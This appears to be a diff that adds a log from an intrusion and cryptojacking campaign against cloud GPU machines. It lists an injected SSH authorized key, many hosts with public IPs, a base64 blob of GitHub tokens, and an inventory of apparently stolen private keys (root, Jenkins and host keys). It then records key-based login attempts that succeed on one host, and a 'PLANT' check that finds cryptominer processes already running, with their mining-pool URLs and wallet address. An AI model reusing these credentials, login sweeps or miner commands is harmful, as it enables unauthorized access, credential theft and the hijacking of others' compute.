@@ -1,0 +1,170 @@
+==MARKER2-START host=t19-l40s1-eude2-canon ts=1795583918
+==AUTHKEYS
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMAdZRZegdhDMlj+F6IkgyNHO8CPsINpCjC96WfPeFqm
+==SSHD
+Include /etc/ssh/sshd_config.d/*.conf
+KbdInteractiveAuthentication no
+UsePAM yes
+X11Forwarding yes
+PrintMotd no
+AcceptEnv LANG LC_*
+Subsystem	sftp	/usr/lib/openssh/sftp-server
+==HOSTS
+t1946107x1	20.125.99.42	t19	westus3	Standard_NC40ads_H100_v5
+t1946107x136	23.100.38.120	t19	westus	Standard_NC80adis_H100_v5
+t1946107x137	20.245.108.11	t19	westus	Standard_NC80adis_H100_v5
+t1946107x138	20.59.127.108	t19	westus	Standard_NC80adis_H100_v5
+t1946107x139	20.237.207.128	t19	westus	Standard_NC80adis_H100_v5
+t1946107x152	74.162.158.9	t19	uaenorth	Standard_NC40ads_H100_v5
+t1946107x153	40.123.206.138	t19	uaenorth	Standard_NC40ads_H100_v5
+t1946107x154	20.74.241.13	t19	uaenorth	Standard_NC40ads_H100_v5
+t1946107x156	20.216.40.163	t19	uaenorth	Standard_NC40ads_H100_v5
+t1946107x157	20.74.153.201	t19	uaenorth	Standard_NC40ads_H100_v5
+t1946107x180	48.193.46.184	t19	indonesiacentral	Standard_NC40ads_H100_v5
+t1946107x181	48.193.47.3	t19	indonesiacentral	Standard_NC40ads_H100_v5
+t1946107x182	70.153.142.83	t19	indonesiacentral	Standard_NC40ads_H100_v5
+t1946107x183	70.153.148.119	t19	indonesiacentral	Standard_NC40ads_H100_v5
+t1946107x184	70.153.87.133	t19	indonesiacentral	Standard_NC40ads_H100_v5
+t1946107x185	70.153.149.34	t19	indonesiacentral	Standard_NC40ads_H100_v5
+t1946107x186	70.153.141.118	t19	indonesiacentral	Standard_NC40ads_H100_v5
+t1946107x187	70.153.18.193	t19	indonesiacentral	Standard_NC40ads_H100_v5
+t1946107x311	20.74.242.85	t19	uaenorth	Standard_NC40ads_H100_v5
+t1946107x4	57.154.50.93	t19	westus3	Standard_NC40ads_H100_v5
+t1946107x40	20.115.147.1	t19	westus2	Standard_NC40ads_H100_v5
+t1946107x407	172.213.25.163	t19	italynorth	Standard_ND96amsr_A100_v4
+t1946107x409	20.225.239.178	t19	southcentralus	Standard_ND96amsr_A100_v4
+t1946107x41	20.234.97.205	t19	northeurope	Standard_NC40ads_H100_v5
+t1946107x415	51.104.16.184	t19	uksouth	Standard_ND96amsr_A100_v4
+t1946107x416	20.50.113.151	t19	uksouth	Standard_NC40ads_H100_v5
+t1946107x42	135.116.19.243	t19	swedencentral	Standard_NC40ads_H100_v5
+t1946107x44	20.109.162.87	t19	westus2	Standard_NC40ads_H100_v5
+t1946107x440	168.62.216.152	t19	westus	Standard_NC24ads_A100_v4
+t1946107x442	172.174.31.97	t19	eastus	Standard_NC80adis_H100_v5
+t1946107x45	20.109.152.114	t19	westus2	Standard_NC40ads_H100_v5
+t1946107x47	134.149.59.33	t19	northeurope	Standard_NC40ads_H100_v5
+t1946107x48	40.113.1.63	t19	northeurope	Standard_NC40ads_H100_v5
+t1946107x49	74.234.69.82	t19	northeurope	Standard_NC40ads_H100_v5
+t1946107x50	135.116.84.27	t19	swedencentral	Standard_NC40ads_H100_v5
+t1946107x52	20.125.49.91	t19	westus2	Standard_NC40ads_H100_v5
+t1946107x53	4.246.80.6	t19	westus2	Standard_NC40ads_H100_v5
+t1946107x54	20.125.42.21	t19	westus2	Standard_NC40ads_H100_v5
+t1946107x55	4.155.130.93	t19	westus2	Standard_NC40ads_H100_v5
+t1946107x56	20.223.198.42	t19	northeurope	Standard_NC40ads_H100_v5
+t1946107x57	98.71.78.150	t19	northeurope	Standard_NC40ads_H100_v5
+t1946107x59	4.210.119.224	t19	northeurope	Standard_NC40ads_H100_v5
+t1946107x60	135.225.79.249	t19	swedencentral	Standard_NC40ads_H100_v5
+t1946107x61	20.240.55.118	t19	swedencentral	Standard_NC40ads_H100_v5
+t1946107x62	20.240.141.10	t19	swedencentral	Standard_NC40ads_H100_v5
+t1946107x63	20.240.130.208	t19	swedencentral	Standard_NC40ads_H100_v5
+t1946107x70	52.236.59.223	t19	northeurope	Standard_NC40ads_H100_v5
+t1946107x71	20.91.207.55	t19	swedencentral	Standard_NC40ads_H100_v5
+t1946107x76	20.205.187.223	t19	southeastasia	Standard_NC40ads_H100_v5
+t1946107x77	4.194.2.30	t19	southeastasia	Standard_NC40ads_H100_v5
+t1946107x78	4.204.241.108	t19	canadacentral	Standard_NC40ads_H100_v5
+t1946107x82	134.149.42.155	t19	northeurope	Standard_NC24ads_A100_v4
+t1946107x83	4.193.185.193	t19	southeastasia	Standard_NC24ads_A100_v4
+t1946107x84	57.174.238.72	t19	swedencentral	Standard_NC24ads_A100_v4
+t1946107x85	20.118.131.83	t19	westus3	Standard_NC24ads_A100_v4
+t1950791eus2	40.70.241.0	t19	eastus2	Standard_NC80adis_H100_v5
+t1950791eus22	20.97.252.251	t19	eastus2	Standard_NC80adis_H100_v5
+t1950791eus23	20.114.255.207	t19	eastus2	Standard_NC80adis_H100_v5
+t1950791eus24	40.70.247.98	t19	eastus2	Standard_NC80adis_H100_v5
+==SECRETS
+ewogICJnaXRodWJfdG9rZW4iOiAiZ2hzXzE1MzY4X2V5SmhiR2NpT2lKRlV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUpoZFdRaU9pSmhkWFJvYm1RaUxDSmpkSGdpT2lKdFkyZFBNbHBUTWpsUWVTMTRYME55VDFKV1VHaGlTV2g0Y1ZabVIxbFRRbEoyVUVSS05EQlpibTV4Ylc5cGRtVkROR0ZwTkhoeklpd2laWGh3SWpveE56azFNamcyTURRMkxDSnBZWFFpT2pFM09UVXlPREkwTkRZc0ltbHpjeUk2SW1kcGRHaDFZaUlzSW1wMGFTSTZJbUZrTnpReE5HRmpMVGRrTXpndE5EVTVaaTA1T0RsaExUa3dabVEyTmpWa09USmlNQ0lzSW5abGNpSTZNMzAuaVdIMVV6b1BZWWotSm51Mkt5QXJ1a1lId0xjek0tbzFzZV9wRWsxTHhFa3dPREU4c2R4WFZzSERCTWlQejNRTTk0bGl3VmhzQlRyNEFBSTdaQ092b0EiLAogICJHSF9QQVQiOiAiZ2hwXzZ0UDI1aUM5d3BDWUJaRW1wUlZST0toRXhJZW1UYzJ1cDRpNyIKfQ==
+ewogICJnaXRodWJfdG9rZW4iOiAiZ2hzXzE1MzY4X2V5SmhiR2NpT2lKRlV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUpoZFdRaU9pSmhkWFJvYm1RaUxDSmpkSGdpT2lKdFkyZFBNbHBUTWpsUWVTMTRYME55VDFKV1VHaGlTV2g0Y1ZabVIxbFRRbEoyVUVSS05EQlpibTV4Ylc5cGRtVkROR0ZwTkhoeklpd2laWGh3SWpveE56azFNamcyTURRMkxDSnBZWFFpT2pFM09UVXlPREkwTkRZc0ltbHpjeUk2SW1kcGRHaDFZaUlzSW1wMGFTSTZJbUZrTnpReE5HRmpMVGRrTXpndE5EVTVaaTA1T0RsaExUa3dabVEyTmpWa09USmlNQ0lzSW5abGNpSTZNMzAuaVdIMVV6b1BZWWotSm51Mkt5QXJ1a1lId0xjek0tbzFzZV9wRWsxTHhFa3dPREU4c2R4WFZzSERCTWlQejNRTTk0bGl3VmhzQlRyNEFBSTdaQ092b0EiLAogICJHSF9QQVQiOiAiZ2hwXzZ0UDI1aUM5d3BDWUJaRW1wUlZST0toRXhJZW1UYzJ1cDRpNyIKfQ==
+==KEYINV
+KEY /tmp/k/a.pem 387 
+KEY /tmp/k/azadmin.pem 387 SHA256:V+uMJZB1yR1KhjQhePf4b0U8sS2+obYQ7jWuWojOvLs
+KEY /tmp/k/ibm_key.pem 387 SHA256:S6OVYduABzmwu49F/0KGKwjUCOdq1wArbFY9JqmfCrY
+KEY /tmp/k/k.pem 387 
+KEY /tmp/k/k01_k_ali_ 387 SHA256:xDd4nLNfn6dVy2MuLjLMavMYA1lccjPEU8iVfUJqkGA
+KEY /tmp/k/k04_ibm_key.pem_ 387 SHA256:S6OVYduABzmwu49F/0KGKwjUCOdq1wArbFY9JqmfCrY
+KEY /tmp/k/k07_h4n2__h4keys__k_gpu2_new_ 411 SHA256:x/EXVMnuAPHz8dbTOWK8/+mnR/e5Shh2YiYPmVlVUPw
+KEY /tmp/k/k08_var_lib_jenkins_.ssh_id_rsa.txt_ 318 
+KEY /tmp/k/k09_node-client.key_ 227 SHA256:+J/oTkqlpSyAZqy7HTS/X0/AZUoEPlTHMc+o/AItebA
+KEY /tmp/k/k106_es_ssh.sh_ 1086 
+KEY /tmp/k/k108_ssh_host_ecdsa_key_ 513 SHA256:JNeHQAAH6N5Sfkj0++wGKAxPyosuGIlh2Ob3YOPQ+Sw
+KEY /tmp/k/k109_ssh_host_ed25519_key_ 411 SHA256:i/1Tw9vIj0QPVc0YLhE6m7U32kGvWU6hzY5Mt0fqm+M
+KEY /tmp/k/k10_hk171_key_ 387 SHA256:prNVVVhBWIYgL3JseCjx2+WbE+CP/pPYx0K795Sm6AE
+KEY /tmp/k/k110_k04_ 1106 
+KEY /tmp/k/k117_k14_ 1106 
+KEY /tmp/k/k118_id_lily_ 411 SHA256:uDs0K6oMKbzWXcwo5g9jNMcUPpN5A+CZBGbsqdgJf3I
+KEY /tmp/k/k119_keys.txt_ 717 SHA256:8mZL+DwIiBr9LWN5+ZnZtU2tp5+iwPD12xl+0vBOiT8
+KEY /tmp/k/k11_key_e52c930e374a_ 401 
+KEY /tmp/k/k12_key_66afe00c1fc0_ 295 
+KEY /tmp/k/k14_key_a922956628b3_ 3401 SHA256:Y84mWxYQBH6Kk/RvRSERUoGhLp5EZuroQ99bSSTUf1o
+KEY /tmp/k/k15_key_455e01b7de3b_ 387 SHA256:3TXKFQH0fnYALnV5Asf23GQtFuGevTnyM/o0hmHhgw8
+KEY /tmp/k/k175_kc69171_key_3.pem_ 1675 SHA256:J8lvwuL/S0wt1odu5F3elNK/Qn8SHzr/T02N/SSS4mE
+KEY /tmp/k/k176_kc69171_key_1.pem_ 1679 SHA256:z2ycLPXNiGdgLsy6hHgnQLUXVp26VIyVvluzGfLEAcc
+KEY /tmp/k/k17_key_368737bcca7d_ 411 SHA256:0VWtiuPuqmvy4ubXB9nt/nkAoha3Ltfw2EOtZewvwkI
+KEY /tmp/k/k186_id_cluster_pem_ 1675 SHA256:FU9lsLefDaMHbrsUEj2v5QVl28pR8dgdNdRh4VuBXOY
+KEY /tmp/k/k18_key_6d536d305b74_ 419 SHA256:QaM5yKMEvvojoE2lK1J0oQGvezjuIspQeS123+6jcgc
+KEY /tmp/k/k191_id_i233_ 387 SHA256:F7Fpe+sdixdcyQuuQeZOnw7xlJmaYWqG4d883tHp9Tg
+KEY /tmp/k/k192_ssh_hk_ed25519_ 387 SHA256:yZmkviYuDMTyj3HLTpkcQ4YtR+FE2otQxDIMDyVT5Us
+KEY /tmp/k/k193_ssh_hkr_rsa_ 1675 SHA256:q0m8TdWBV0Y7IeSTEZXZK5Y/E8WatWqCClBdKcyEYss
+KEY /tmp/k/k194_root_.ssh_id_rsa.raw_ 388 
+KEY /tmp/k/k195_kafka.yaml_ 2132 
+KEY /tmp/k/k197_qlik_sense.yaml_ 1924 
+KEY /tmp/k/k19_key_2c3d573516ce_ 3361 SHA256:L2ROKrQNl9L93L030eaeWPufI+egattw4x5Mb6IUDf4
+KEY /tmp/k/k200_root_.ssh_id_rsa.segs_ 370 
+KEY /tmp/k/k201_jobs5.log_ 681 
+KEY /tmp/k/k20_key_75fc8043a5b4_ 444 SHA256:k4qzpD154EecxPnXvCbI32UsCPBiOFL5uc3W/NKxcq0
+KEY /tmp/k/k239_hk_i410_ 387 SHA256:heOX+cxdVhvljcvRpOIOYXD/abwWKCBCT21i/kDRww8
+KEY /tmp/k/k23_key_dfce1abf326e_ 387 SHA256:p5CWgLR6IB2HQtdLBfkmCdaRF6EspHsIugT9rMwTTKg
+KEY /tmp/k/k25_key_908bb3b196c2_ 283 
+KEY /tmp/k/k28_key_cda363fe3325_ 417 
+KEY /tmp/k/k30_key_fb54435881b3_ 756 SHA256:dZ72e+MkkJ6vEPKVXr52FIBcoG8/G3qTwV+tZVWnwVo
+KEY /tmp/k/k38_key_9e74cc967df5_ 387 SHA256:rpmjeOEfSP2V23KKYmX2JoZTIRpvrCXwylQPl6lmhME
+KEY /tmp/k/k43_key_87e8986252cd_ 1801 SHA256:3VNafRybrNdHxXRp+tGs8GTdqvqCiUj+9KpGEcaB3F4
+KEY /tmp/k/k47_key_3bc328e8803a_ 205 
+KEY /tmp/k/k48_key_81bddc9f4300_ 3361 SHA256:0aUgyfaxXUs0v353Rnll2PP0mfJQlV2ewfkMTryLiIo
+KEY /tmp/k/k51_key_fd8989e91931_ 2524 
+KEY /tmp/k/k52_key_d3a46aa5a30b_ 387 SHA256:d7b0sKxBTy7iA9ig8VB9b8c+6wCbky3ZKb85qey/PUU
+KEY /tmp/k/k58_key_863023474c87_ 417 
+KEY /tmp/k/k59_key_f926f96b63a5_ 2959 
+KEY /tmp/k/k65_key_06c0d35d8eb2_ 411 SHA256:X3x7+KM3wNyA+pLGfDrc5MrQk+VugwMc10TeIDPjBao
+KEY /tmp/k/k68_key_dd310d9fb76a_ 886 
+KEY /tmp/k/k70_k5-test.json_ 1308 
+KEY /tmp/k/k73_key_7cf423e4fba1_ 411 SHA256:SmbxjkiXQzGG2leDRNJZCRCOCkUTznw0uDrYmyZWh1I
+KEY /tmp/k/k74_key_587630e399e6_ 405 
+KEY /tmp/k/k76_key_853e3da16e23_ 259 
+KEY /tmp/k/k79_key_29511719ff38_ 206 
+KEY /tmp/k/k83_key_e29836a0663f_ 756 SHA256:izEyNx6uKd/wdX8vDDVqKB7YwCJwxBo1tnbEXRoln0o
+KEY /tmp/k/k85_key_a6691c8e88dc_ 1801 SHA256:uJgiOG74cd/39gOn0U7DSEK1KCSjGj3z0jY1zm9K7FA
+KEY /tmp/k/k86_key_dd8275779dd8_ 3361 SHA256:T4TvgvaRwShqVUELTkUgjzZTZoBFePU5ZBFynXO54gQ
+KEY /tmp/k/k87_key_ea4577b3c649_ 457 
+KEY /tmp/k/k90_key_7eaec9da59d3_ 499 
+KEY /tmp/k/k92_key_dcf75428a3b3_ 387 SHA256:4DwxAt1vsKCS+UlLLE1rNW34CLutk6MHie7lsYlzDWI
+KEY /tmp/k/k97_key_b6a8cd4b7a00_ 432 SHA256:skeaRdbyHMKvAJK92WhW6nEGKNQSYxEfoCQFCMihCJ8
+KEY /tmp/k/k99_key_93e647863eee_ 387 SHA256:BglVX6iaWHYpKOHlChmyZqw1jAJL2Ms6W46zOvhqi/4
+KEY /tmp/k/k_ali 387 SHA256:xDd4nLNfn6dVy2MuLjLMavMYA1lccjPEU8iVfUJqkGA
+KEY /tmp/k/k_id25519 387 SHA256:V+uMJZB1yR1KhjQhePf4b0U8sS2+obYQ7jWuWojOvLs
+KEY /tmp/k/kh.b64 149106 
+==SSHMATCH
+MATCH /tmp/k/ibm_key.pem
+MATCH /tmp/k/k04_ibm_key.pem_
+==WAVE
+1005 /tmp/combos.txt
+WAVE_N=4
+10.243.0.24 
+OKLOGIN 10.243.0.24 ubuntu ibm_key.pem :: Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+OKLOGIN 10.243.0.24 ubuntu k04_ibm_key.pem_ :: Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),118(netdev),119(lxd)
+==PLANT
+WON:
+10.243.0.24 ubuntu ibm_key.pem
+--- HOST 10.243.0.24 user=ubuntu key=ibm_key.pem
+Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),118(netdev),119(lxd)
+t19-l4s-eudk
+GPU 0: NVIDIA L4 (UUID: GPU-0fc206d4-3728-9fbe-cbbb-72c0d3397bef)
+0, NVIDIA L4, 23034 MiB, 1793524018755, GPU-0fc206d4-3728-9fbe-cbbb-72c0d3397bef
+ARGV:
+37955 /bin/bash /opt/t19/keep.sh
+37973 /opt/t19/peakminer -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz -w ul-t19-ibm-158-177-14-170-g0 -p x -c pearl -d 0 -i 60 -a 0
+37977 /opt/t19/peakminer -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://pool.pearlhash.xyz:9000 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz -w ul-t19-ibm-158-177-14-170-g0 -p x -c pearl -d 0 -i 60 -a 0
+164031 bash -c id; hostname; sudo -n nvidia-smi -L; sudo -n nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv,noheader; echo ARGV:; pgrep -af "peakminer|srb|run-g|keep.sh" | head -20; echo NV:; ls -la /opt/nv 2>/dev/null | head; cat /opt/nv/fip 2>/dev/null
+NV:
+--- 10.243.0.24 gpus=1 miners=2
+--- 10.243.0.24 NO-PLANT gpus=1 miners=2
+==MARKER2-END
